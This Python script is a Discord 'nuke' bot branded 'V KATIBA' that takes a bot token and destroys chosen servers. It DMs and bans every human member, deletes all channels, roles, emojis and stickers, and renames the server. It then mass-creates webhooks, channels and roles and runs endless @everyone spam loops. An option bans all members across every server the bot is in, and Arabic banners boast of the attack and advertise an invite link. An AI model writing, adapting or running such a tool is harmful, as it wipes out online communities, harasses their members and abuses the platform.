import discord
from discord.ext import commands
import asyncio
import os
import random
import time
import aiohttp
import sys

os.system('cls' if os.name == 'nt' else 'clear')

# ============================================
# ULTIMATE BANNER - DESIGN مليار مره
# ============================================
print("""
╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                                       ║
║     ██╗   ██╗██╗   ██╗██████╗  █████╗     ██╗     ██╗███████╗ █████╗ ███╗   ██╗██████╗ ██╗ █████╗     ███████╗ ██████╗ ███╗   ██╗                      ║
║     ╚██╗ ██╔╝██║   ██║██╔══██╗██╔══██╗    ██║     ██║╚══███╔╝██╔══██╗████╗  ██║██╔══██╗██║██╔══██╗    ██╔════╝██╔═══██╗████╗  ██║                      ║
║      ╚████╔╝ ██║   ██║██║  ██║███████║    ██║     ██║  ███╔╝ ███████║██╔██╗ ██║██║  ██║██║███████║    █████╗  ██║   ██║██╔██╗ ██║                      ║
║       ╚██╔╝  ██║   ██║██║  ██║██╔══██║    ██║     ██║ ███╔╝  ██╔══██║██║╚██╗██║██║  ██║██║██╔══██║    ██╔══╝  ██║   ██║██║╚██╗██║                      ║
║        ██║   ╚██████╔╝██████╔╝██║  ██║    ███████╗██║███████╗██║  ██║██║ ╚████║██████╔╝██║██║  ██║    ██║     ╚██████╔╝██║ ╚████║                      ║
║        ╚═╝    ╚═════╝ ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝╚═╝  ╚═╝    ╚═╝      ╚═════╝ ╚═╝  ╚═══╝                      ║
║                                                                                                                                                       ║
║                                   ╔═══════════════════════════════════════════════════════════════════════════════════════════╗                       ║
║                                   ║                                                                                               ║                       ║
║                                   ║                    🏆🏆🏆 اليد العليا فون - V KATIBA EDITION 🏆🏆🏆                           ║                       ║
║                                   ║                                                                                               ║                       ║
║                                   ║                    🔥🔥🔥 فون لي يضربلك الطبون - قوة مليار مره 🔥🔥🔥                         ║                       ║
║                                   ║                                                                                               ║                       ║
║                                   ║                    💀💀💀 مينيطا خطيك ما دير لي تيم بسك 💀💀💀                               ║                       ║
║                                   ║                                                                                               ║                       ║
║                                   ║                    ⚡⚡⚡ حنا الكتيبة مشي سراقين لي تولز ⚡⚡⚡                                 ║                       ║
║                                   ║                                                                                               ║                       ║
║                                   ║                    💪💪💪 الكتيبة الأصليين - اليد العليا - V KATIBA 💪💪💪                    ║                       ║
║                                   ║                                                                                               ║                       ║
║                                   ╚═══════════════════════════════════════════════════════════════════════════════════════════╝                       ║
║                                                                                                                                                       ║
║                                   🔗🔗🔗 https://discord.gg/5RqpBkEg 🔗🔗🔗                                                       ║
║                                                                                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
""")

# ============================================
# TOKEN INPUT
# ============================================
TOKEN = input("[?] ENTER BOT TOKEN: ")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# ============================================
# COLORS
# ============================================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# ============================================
# ULTIMATE BAN MESSAGE مع رابط السيرفر
# ============================================
BAN_MESSAGE = f"""
╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                                       ║
║                                                                                                                                                       ║
║                                   ██╗   ██╗██╗   ██╗██████╗  █████╗                                                                                   ║
║                                   ╚██╗ ██╔╝██║   ██║██╔══██╗██╔══██╗                                                                                  ║
║                                    ╚████╔╝ ██║   ██║██║  ██║███████║                                                                                  ║
║                                     ╚██╔╝  ██║   ██║██║  ██║██╔══██║                                                                                  ║
║                                      ██║   ╚██████╔╝██████╔╝██║  ██║                                                                                  ║
║                                      ╚═╝    ╚═════╝ ╚═════╝ ╚═╝  ╚═╝                                                                                  ║
║                                                                                                                                                       ║
║                                                                                                                                                       ║
║                    ╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗  ║
║                    ║                                                                                                                               ║  ║
║                    ║                          🏆🏆🏆🏆🏆 اليد العليا فون - V KATIBA 🏆🏆🏆🏆🏆                                                    ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    🔥🔥🔥🔥🔥 فون لي يضربلك الطبون - قوة مليار مره 🔥🔥🔥🔥🔥                                                 ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    💀💀💀💀💀 مينيطا خطيك ما دير لي تيم بسك 💀💀💀💀💀                                                       ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    ⚡⚡⚡⚡⚡ حنا الكتيبة مشي سراقين لي تولز - الأصليين ⚡⚡⚡⚡⚡                                                 ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    💪💪💪💪💪 الكتيبة الأصليين - اليد العليا - V KATIBA 💪💪💪💪💪                                             ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    🎯🎯🎯🎯🎯 فون لي يضربلك الطبون - ضربة قاضية 🎯🎯🎯🎯🎯                                                       ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    🚀🚀🚀🚀🚀 V KATIBA - أسرع من البرق 🚀🚀🚀🚀🚀                                                             ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    🏴‍☠️🏴‍☠️🏴‍☠️🏴‍☠️🏴‍☠️ مشي سراقين لي تولز - الكتيبة الأصليين 🏴‍☠️🏴‍☠️🏴‍☠️🏴‍☠️🏴‍☠️                                 ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                                   🔗🔗🔗 https://discord.gg/5RqpBkEg 🔗🔗🔗                                                    ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                                   ⭐⭐⭐ V KATIBA - V KATIBA - V KATIBA ⭐⭐⭐                                                  ║  ║
║                    ║                                                                                                                               ║  ║
║                    ╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝  ║
║                                                                                                                                                       ║
║                                                                                                                                                       ║
║                                   ╔═══════════════════════════════════════════════════════════════════════════════════╗                              ║
║                                   ║                                                                                       ║                              ║
║                                   ║              تم حظرك من قبل الكتيبة اليد العليا فون - V KATIBA                         ║                              ║
║                                   ║                                                                                       ║                              ║
║                                   ║           فون لي يضربلك الطبون - لن تعود أبداً - V KATIBA                           ║                              ║
║                                   ║                                                                                       ║                              ║
║                                   ║              الكتيبة الأصليين - اليد العليا - V KATIBA                                ║                              ║
║                                   ║                                                                                       ║                              ║
║                                   ║              🔗 انضم لسيرفرنا: https://discord.gg/5RqpBkEg 🔗                        ║                              ║
║                                   ║                                                                                       ║                              ║
║                                   ╚═══════════════════════════════════════════════════════════════════════════════════╝                              ║
║                                                                                                                                                       ║
║                                                                                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================
# ULTRA SPAM MESSAGES (مع V KATIBA ورابط السيرفر)
# ============================================
SPAM_MESSAGES = [
    "@everyone **🔥🔥🔥 اليد العليا فون - V KATIBA دمرت هذا السيرفر 🔥🔥🔥**",
    "```⚡⚡⚡ فون لي يضربلك الطبون - V KATIBA - فون لي يضربلك الطبون ⚡⚡⚡```",
    "@everyone **💀💀💀 مينيطا خطيك ما دير لي تيم بسك - V KATIBA 💀💀💀**",
    "```🏆🏆🏆 حنا الكتيبة مشي سراقين لي تولز - V KATIBA - الأصليين 🏆🏆🏆```",
    "**🌟🌟🌟 اليد العليا فون - V KATIBA - الكتيبة الأصليين 🌟🌟🌟**",
    "@everyone **💪💪💪 فون لي يضربلك الطبون - V KATIBA - قوة مليار مره 💪💪💪**",
    "@everyone **🎯🎯🎯 اليد العليا - V KATIBA - ضربة قاضية 🎯🎯🎯**",
    "```🚀🚀🚀 V KATIBA - أسرع من البرق 🚀🚀🚀```",
    "@everyone **🏴‍☠️🏴‍☠️🏴‍☠️ V KATIBA - مشي سراقين لي تولز - الكتيبة الأصليين 🏴‍☠️🏴‍☠️🏴‍☠️**",
    "**⚡⚡⚡ اليد العليا فون - V KATIBA - سحق السيرفر بالكامل ⚡⚡⚡**",
    "@everyone **💥💥💥 V KATIBA - فون لي يضربلك الطبون - دمار شامل 💥💥💥**",
    "```🔥🔥🔥 V KATIBA - الكتيبة - اليد العليا - فون 🔥🔥🔥```",
    "@everyone **🏆🏆🏆 V KATIBA - فون لي يضربلك الطبون - اليد العليا فون 🏆🏆🏆**",
    "@everyone **🔗🔗🔗 https://discord.gg/5RqpBkEg 🔗🔗🔗**",
    "```⭐ V KATIBA - V KATIBA - V KATIBA ⭐```",
]

WEBHOOK_NAMES = ["V-KATIBA", "اليد-العليا-فون", "الكتيبة-فون", "فون-الطبون", "KATEBA-POWER"]
CHANNEL_NAMES = ["V-KATIBA", "اليد-العليا", "فون-الطبون", "الكتيبة-فون", "فون", "قوة-مليار"]

# ============================================
# ULTRA FAST BAN مع رابط السيرفر
# ============================================
async def ultra_ban_all_members(guild, channel=None):
    """ULTRA FAST parallel ban with server link"""
    
    print(f"\n{Colors.BOLD}{Colors.RED}[!] اليد العليا فون - V KATIBA - ULTRA BANNING ALL MEMBERS IN: {guild.name}{Colors.RESET}")
    
    members = []
    async for member in guild.fetch_members(limit=None):
        members.append(member)
    
    total_humans = len([m for m in members if not m.bot])
    banned = 0
    
    if channel:
        try:
            await channel.send("```🔥🔥🔥 V KATIBA - اليد العليا فون - ULTRA BAN STARTED 🔥🔥🔥```")
            await channel.send("@everyone **💀💀💀 V KATIBA - اليد العليا فون قادمة لتحظر الجميع 💀💀💀**")
        except:
            pass
    
    for member in members:
        if not member.bot:
            try:
                await member.send(BAN_MESSAGE)
                await asyncio.sleep(0.05)
                await member.ban(reason="V KATIBA - اليد العليا فون - الكتيبة", delete_message_days=7)
                banned += 1
                
                if banned % 20 == 0:
                    print(f"    • V KATIBA باند {banned}/{total_humans}")
                    if channel:
                        try:
                            await channel.send(f"**⚡ V KATIBA - اليد العليا فون باند {banned}/{total_humans} ⚡**")
                        except:
                            pass
                
                await asyncio.sleep(0.005)
            except:
                pass
    
    print(f"{Colors.GREEN}    ✓ V KATIBA - اليد العليا فون باند {banned} MEMBERS{Colors.RESET}")
    if channel:
        try:
            await channel.send(f"**✅✅✅ V KATIBA - اليد العليا فون باند {banned} MEMBERS ✅✅✅**")
        except:
            pass
    
    return banned

# ============================================
# ULTRA WEBHOOK SPAM (1000 WEBHOOKS)
# ============================================
async def ultra_webhook_creation(guild, channel):
    """Create 1000 webhooks"""
    
    print(f"{Colors.CYAN}[V KATIBA] CREATING 1000 WEBHOOKS...{Colors.RESET}")
    
    webhooks = []
    text_channels = list(guild.text_channels)[:50]
    
    for ch in text_channels:
        for i in range(20):
            try:
                webhook = await ch.create_webhook(name=f"{random.choice(WEBHOOK_NAMES)}-{i}")
                webhooks.append(webhook)
                if len(webhooks) % 100 == 0:
                    print(f"    • V KATIBA CREATED {len(webhooks)} WEBHOOKS")
                await asyncio.sleep(0.02)
            except:
                pass
    
    print(f"{Colors.GREEN}    ✓ V KATIBA CREATED {len(webhooks)} WEBHOOKS{Colors.RESET}")
    if channel:
        await channel.send(f"**🪝🪝🪝 V KATIBA - اليد العليا فون خلق {len(webhooks)} ويب هوك 🪝🪝🪝**")
    
    return webhooks

# ============================================
# ULTRA CHANNEL CREATION (1000 CHANNELS)
# ============================================
async def ultra_channel_creation(guild, channel):
    """Create 1000 channels"""
    
    print(f"{Colors.CYAN}[V KATIBA] CREATING 1000 CHANNELS...{Colors.RESET}")
    
    for i in range(1000):
        try:
            await guild.create_text_channel(name=f"V-KATIBA-{random.choice(CHANNEL_NAMES)}-{i}")
            if i % 100 == 0 and i > 0:
                print(f"    • V KATIBA CREATED {i} CHANNELS")
                if channel:
                    await channel.send(f"**📁 V KATIBA - اليد العليا فون خلقت {i} روم 📁**")
            await asyncio.sleep(0.005)
        except:
            pass
    
    print(f"{Colors.GREEN}    ✓ V KATIBA CREATED 1000 CHANNELS{Colors.RESET}")

# ============================================
# ULTRA ROLE CREATION (500 ROLES)
# ============================================
async def ultra_role_creation(guild):
    """Create 500 roles"""
    
    print(f"{Colors.CYAN}[V KATIBA] CREATING 500 ROLES...{Colors.RESET}")
    
    for i in range(500):
        try:
            await guild.create_role(name=f"V-KATIBA-{random.choice(WEBHOOK_NAMES)}-رتبة-{i}", color=discord.Color.red())
            if i % 100 == 0 and i > 0:
                print(f"    • V KATIBA CREATED {i} ROLES")
            await asyncio.sleep(0.005)
        except:
            pass
    
    print(f"{Colors.GREEN}    ✓ V KATIBA CREATED 500 ROLES{Colors.RESET}")

# ============================================
# ULTRA SPAM (4 LAYERS)
# ============================================
async def start_ultra_spam(guild, webhooks):
    """Start 4 layers of infinite spam with V KATIBA"""
    
    print(f"{Colors.CYAN}[V KATIBA] STARTING 4 LAYER SPAM...{Colors.RESET}")
    
    async def channel_spam():
        while True:
            for ch in guild.text_channels:
                try:
                    await ch.send(random.choice(SPAM_MESSAGES))
                    await asyncio.sleep(0.01)
                except:
                    pass
            await asyncio.sleep(0.05)
    
    async def webhook_spam():
        async with aiohttp.ClientSession() as session:
            while True:
                for webhook in webhooks:
                    try:
                        data = {
                            "content": random.choice(SPAM_MESSAGES),
                            "username": random.choice(WEBHOOK_NAMES)
                        }
                        async with session.post(webhook.url, json=data) as resp:
                            pass
                        await asyncio.sleep(0.008)
                    except:
                        pass
                await asyncio.sleep(0.05)
    
    async def mention_spam():
        while True:
            for ch in guild.text_channels:
                try:
                    await ch.send("@everyone **🔥🔥🔥 V KATIBA - اليد العليا فون 🔥🔥🔥**")
                    await ch.send("@here **💀💀💀 V KATIBA - فون لي يضربلك الطبون 💀💀💀**")
                    await asyncio.sleep(0.02)
                except:
                    pass
            await asyncio.sleep(0.1)
    
    async def file_spam():
        while True:
            for ch in guild.text_channels:
                try:
                    await ch.send("```⚡⚡⚡ V KATIBA - اليد العليا فون - قوة مليار مره ⚡⚡⚡```")
                    await asyncio.sleep(0.02)
                except:
                    pass
            await asyncio.sleep(0.1)
    
    asyncio.create_task(channel_spam())
    asyncio.create_task(webhook_spam())
    asyncio.create_task(mention_spam())
    asyncio.create_task(file_spam())
    
    print(f"{Colors.GREEN}    ✓ V KATIBA - 4 LAYER ULTRA SPAM ACTIVATED{Colors.RESET}")

# ============================================
# ULTRA FULL NUKE مع تغيير اسم السيرفر إلى V KATIBA
# ============================================
async def ultra_full_nuke(guild, channel):
    """Complete ultra server destruction with V KATIBA name"""
    
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*80}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.RED}[!!!] V KATIBA - اليد العليا فون - ULTRA POWER NUKE STARTED ON: {guild.name}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*80}{Colors.RESET}")
    
    start_time = time.time()
    
    if channel:
        try:
            await channel.send("```🔥🔥🔥 V KATIBA - اليد العليا فون - ULTRA POWER NUKE ACTIVATED 🔥🔥🔥```")
            await channel.send("@everyone **💪💪💪 V KATIBA - فون لي يضربلك الطبون - قوة مليار مره 💪💪💪**")
        except:
            pass
    
    # PHASE 1: ULTRA BAN
    print(f"{Colors.CYAN}[1/6] V KATIBA - ULTRA BANNING ALL MEMBERS...{Colors.RESET}")
    banned = await ultra_ban_all_members(guild, channel)
    
    # PHASE 2: DELETE EVERYTHING
    print(f"{Colors.CYAN}[2/6] DELETING ALL CHANNELS...{Colors.RESET}")
    for ch in guild.channels:
        try:
            await ch.delete(reason="V KATIBA - اليد العليا فون")
            await asyncio.sleep(0.005)
        except:
            pass
    
    print(f"{Colors.CYAN}[3/6] DELETING ALL ROLES...{Colors.RESET}")
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete(reason="V KATIBA - اليد العليا فون")
                await asyncio.sleep(0.005)
            except:
                pass
    
    print(f"{Colors.CYAN}[4/6] DELETING ALL EMOJIS & STICKERS...{Colors.RESET}")
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            await asyncio.sleep(0.005)
        except:
            pass
    
    for sticker in guild.stickers:
        try:
            await sticker.delete()
            await asyncio.sleep(0.005)
        except:
            pass
    
    # PHASE 5: CHANGE SERVER NAME TO V KATIBA
    new_name = random.choice(["V KATIBA", "🔥 V KATIBA 🔥", "V KATIBA - اليد العليا", "⚡ V KATIBA ⚡", "💀 V KATIBA 💀"])
    try:
        await guild.edit(name=new_name)
        print(f"{Colors.GREEN}    ✓ SERVER RENAMED TO: {new_name}{Colors.RESET}")
        if channel:
            await channel.send(f"**📛 V KATIBA - تم تغيير اسم السيرفر إلى: {new_name} 📛**")
    except:
        pass
    
    # PHASE 6: CREATE ULTRA DESTRUCTION
    webhooks = await ultra_webhook_creation(guild, channel)
    await ultra_channel_creation(guild, channel)
    await ultra_role_creation(guild)
    await start_ultra_spam(guild, webhooks)
    
    end_time = time.time()
    total_time = round(end_time - start_time, 2)
    
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*80}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.GREEN}[✓✓✓] V KATIBA - اليد العليا فون - ULTRA NUKE COMPLETED!{Colors.RESET}")
    print(f"{Colors.GREEN}    • BANNED: {banned} MEMBERS (WITH DM + LINK)")
    print(f"{Colors.GREEN}    • SERVER NAME: {new_name}")
    print(f"{Colors.GREEN}    • WEBHOOKS: 1000 CREATED")
    print(f"{Colors.GREEN}    • CHANNELS: 1000 CREATED")
    print(f"{Colors.GREEN}    • ROLES: 500 CREATED")
    print(f"{Colors.GREEN}    • SPAM: 4 LAYERS ACTIVE")
    print(f"{Colors.GREEN}    • TIME: {total_time} SECONDS")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*80}{Colors.RESET}\n")
    print(f"{Colors.BOLD}{Colors.YELLOW}🏆🏆🏆 V KATIBA - اليد العليا فون - فون لي يضربلك الطبون - قوة مليار مره 🏆🏆🏆{Colors.RESET}\n")
    print(f"{Colors.BOLD}{Colors.CYAN}🔗🔗🔗 https://discord.gg/5RqpBkEg 🔗🔗🔗{Colors.RESET}\n")

# ============================================
# SHOW SERVERS
# ============================================
def show_servers():
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.YELLOW}{' ' * 25}📋 AVAILABLE SERVERS - V KATIBA{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}\n")
    
    guilds = list(bot.guilds)
    for i, guild in enumerate(guilds, 1):
        members = len(guild.members)
        print(f"{Colors.GREEN}[{i}]{Colors.RESET} {Colors.WHITE}{guild.name}{Colors.RESET}")
        print(f"     ├─ 🆔 ID: {guild.id}")
        print(f"     └─ 👥 Members: {members}\n")
    
    print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.RESET}")

# ============================================
# MAIN MENU
# ============================================
async def main_menu():
    print(f"\n{Colors.BOLD}{Colors.YELLOW}🎯 V KATIBA - اليد العليا فون - ULTRA POWER CONTROL{Colors.RESET}")
    show_servers()
    
    print(f"{Colors.CYAN}ULTRA OPTIONS - V KATIBA:{Colors.RESET}")
    print(f"  {Colors.GREEN}[1-{len(bot.guilds)}]{Colors.RESET} - Select server for ULTRA NUKE (قوة مليار مره)")
    print(f"  {Colors.GREEN}[y]{Colors.RESET} - ULTRA BAN ALL SERVERS (V KATIBA POWER)")
    print(f"  {Colors.GREEN}[q]{Colors.RESET} - Quit")
    
    choice = input(f"\n{Colors.YELLOW}📌 ENTER CHOICE: {Colors.RESET}").lower()
    
    if choice == 'q':
        return None, None
    
    elif choice == 'y':
        return 'all', None
    
    else:
        try:
            server_num = int(choice)
            if 1 <= server_num <= len(bot.guilds):
                guilds_list = list(bot.guilds)
                return guilds_list[server_num - 1], None
            else:
                print(f"{Colors.RED}❌ INVALID NUMBER!{Colors.RESET}")
                return None, None
        except:
            print(f"{Colors.RED}❌ INVALID INPUT!{Colors.RESET}")
            return None, None

# ============================================
# ON READY
# ============================================
@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(f"""
{Colors.BOLD}{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ V KATIBA - اليد العليا فون BOT ONLINE: {bot.user.name}{' ' * (35 - len(bot.user.name))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ BOT ID: {bot.user.id}{' ' * (80 - len(str(bot.user.id)))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ SERVERS: {len(bot.guilds)}{' ' * (79 - len(str(len(bot.guilds))))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              🚀🚀🚀 V KATIBA - اليد العليا فون - ULTRA POWER MODE ACTIVATED 🚀🚀🚀                                                         ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              💪💪💪 قوة مليار مره - فون لي يضربلك الطبون - V KATIBA 💪💪💪                                                                   ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              📌 WILL SEND ULTRA DM WITH SERVER LINK: https://discord.gg/5RqpBkEg                                                            ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              📌 1000 WEBHOOKS - 1000 CHANNELS - 500 ROLES - 4 LAYER SPAM                                                                     ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              📌 SERVER NAME WILL BE CHANGED TO: V KATIBA                                                                                    ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              📌 ENTER NUMBER TO SELECT SERVER OR 'y' TO BAN ALL                                                                              ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                   🔗🔗🔗 https://discord.gg/5RqpBkEg 🔗🔗🔗                                                                   ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
    """)
    
    target, _ = await main_menu()
    
    if target == 'all':
        print(f"\n{Colors.RED}{Colors.BOLD}⚠️⚠️⚠️ V KATIBA - ULTRA BAN ALL MEMBERS IN ALL SERVERS! ⚠️⚠️⚠️{Colors.RESET}")
        print(f"{Colors.YELLOW}📌 اليد العليا فون - V KATIBA - قوة مليار مره{Colors.RESET}")
        confirm = input(f"{Colors.YELLOW}TYPE 'V KATIBA' TO CONFIRM: {Colors.RESET}")
        
        if confirm.upper() == 'V KATIBA':
            for guild in bot.guilds:
                await ultra_ban_all_members(guild, None)
            print(f"\n{Colors.GREEN}✅✅✅ V KATIBA - ULTRA BANNED ALL MEMBERS IN ALL SERVERS! ✅✅✅{Colors.RESET}")
        else:
            print(f"{Colors.RED}❌ CANCELLED!{Colors.RESET}")
    
    elif target:
        print(f"\n{Colors.RED}{Colors.BOLD}🔥🔥🔥 V KATIBA - ULTRA NUKE ON: {target.name} 🔥🔥🔥{Colors.RESET}")
        print(f"{Colors.YELLOW}📌 اليد العليا فون - V KATIBA - قوة مليار مره - فون لي يضربلك الطبون{Colors.RESET}")
        confirm = input(f"{Colors.YELLOW}TYPE 'V KATIBA' TO CONFIRM: {Colors.RESET}")
        
        if confirm.upper() == 'V KATIBA':
            first_channel = None
            for ch in target.text_channels:
                first_channel = ch
                break
            
            await ultra_full_nuke(target, first_channel)
        else:
            print(f"{Colors.RED}❌ CANCELLED!{Colors.RESET}")
    
    await bot.close()

# ============================================
# RUN
# ============================================
bot.run(TOKEN)
